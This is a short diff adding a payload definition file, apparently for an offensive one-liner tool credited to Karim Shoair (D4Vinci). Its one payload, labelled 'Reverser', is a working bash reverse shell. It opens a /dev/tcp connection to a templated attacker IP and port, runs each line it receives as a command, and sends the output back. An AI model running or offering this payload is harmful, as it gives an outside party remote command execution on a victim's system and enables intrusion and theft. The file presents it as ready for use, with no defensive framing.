@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Uses a tool exists on most of the systems and the output of the commands will be piped back.
+
+[Payload]
+Type     = Reverser
+Payload  = exec 5<>/dev/tcp/{ip}/{port} && cat <&5 | while read line; do $line 2>&5 >&5; done
